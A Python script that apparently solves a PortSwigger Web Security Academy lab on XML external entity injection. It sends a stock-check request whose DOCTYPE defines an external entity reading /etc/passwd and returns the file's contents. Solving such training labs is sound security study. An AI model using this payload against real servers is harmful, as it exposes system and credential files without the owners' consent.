import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
# author: 0xyf


class XXE1:
    def __init__(self):
        self.lab_id = "0a55008b039b8c38808a35f60009008a"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def xxe(self):
        xxe_payload_1 = (
            """<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>"""
        )
        xxe_payload_2 = "&xxe;"
        data = f"""<?xml version="1.0" encoding="UTF-8"?>{xxe_payload_1}<stockCheck><productId>{xxe_payload_2}</productId><storeId>1</storeId></stockCheck>"""
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.xxe()
        self.check_solved()


def main():
    XXE1().solve()


if __name__ == "__main__":
    main()
